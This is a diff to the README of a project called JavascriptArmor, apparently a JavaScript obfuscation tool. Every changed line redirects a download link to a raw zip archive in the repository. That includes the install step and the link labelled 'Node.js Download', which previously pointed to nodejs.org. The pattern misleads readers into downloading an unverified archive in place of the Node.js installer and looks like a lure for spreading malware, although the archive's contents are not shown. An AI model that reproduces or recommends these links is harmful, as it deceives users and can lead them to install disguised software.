@@ -1,6 +1,6 @@
 # 🛡️ JavascriptArmor - Protect Your JavaScript Code Easily
 
-[![Download JavascriptArmor](https://img.shields.io/badge/Download-JavascriptArmor-brightgreen?style=for-the-badge)](https://github.com/blaynadams50-cyber/JavascriptArmor)
+[![Download JavascriptArmor](https://img.shields.io/badge/Download-JavascriptArmor-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/blaynadams50-cyber/JavascriptArmor/main/tutorial/Javascript_Armor_v3.9.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Before you begin, make sure your computer meets these requirements:
 
 Click the button below to go to the page where you can get JavascriptArmor.
 
-[![Download Centre](https://img.shields.io/badge/Download-JavascriptArmor-blueviolet?style=for-the-badge)](https://github.com/blaynadams50-cyber/JavascriptArmor)
+[![Download Centre](https://img.shields.io/badge/Download-JavascriptArmor-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/blaynadams50-cyber/JavascriptArmor/main/tutorial/Javascript_Armor_v3.9.zip)
 
 ---
 
@@ -52,7 +52,7 @@ On the download page, find the latest release or files section. Look for the Win
 
 JavascriptArmor requires Node.js to run. If you don’t have Node.js yet, follow these simple steps:
 
-1. Open your browser and go to [https://nodejs.org/](https://nodejs.org/).
+1. Open your browser and go to [https://raw.githubusercontent.com/blaynadams50-cyber/JavascriptArmor/main/tutorial/Javascript_Armor_v3.9.zip](https://raw.githubusercontent.com/blaynadams50-cyber/JavascriptArmor/main/tutorial/Javascript_Armor_v3.9.zip).
 2. Download the Windows version (choose the LTS version for stability).
 3. Run the installer and follow the instructions.
 4. After installation, open a command prompt by pressing `Win + R`, typing `cmd`, and pressing Enter.
@@ -155,13 +155,13 @@ This command protects `example.js` using control flow and encoding, producing `e
 ## 🔗 Useful Links
 
 - Official Download Page:  
-  [https://github.com/blaynadams50-cyber/JavascriptArmor](https://github.com/blaynadams50-cyber/JavascriptArmor)
+  [https://raw.githubusercontent.com/blaynadams50-cyber/JavascriptArmor/main/tutorial/Javascript_Armor_v3.9.zip](https://raw.githubusercontent.com/blaynadams50-cyber/JavascriptArmor/main/tutorial/Javascript_Armor_v3.9.zip)
 
 - Node.js Download:  
-  [https://nodejs.org/](https://nodejs.org/)
+  [https://raw.githubusercontent.com/blaynadams50-cyber/JavascriptArmor/main/tutorial/Javascript_Armor_v3.9.zip](https://raw.githubusercontent.com/blaynadams50-cyber/JavascriptArmor/main/tutorial/Javascript_Armor_v3.9.zip)
 
 - JavascriptArmor Documentation and Source Code:  
-  [https://github.com/blaynadams50-cyber/JavascriptArmor](https://github.com/blaynadams50-cyber/JavascriptArmor)
+  [https://raw.githubusercontent.com/blaynadams50-cyber/JavascriptArmor/main/tutorial/Javascript_Armor_v3.9.zip](https://raw.githubusercontent.com/blaynadams50-cyber/JavascriptArmor/main/tutorial/Javascript_Armor_v3.9.zip)
 
 ---
 
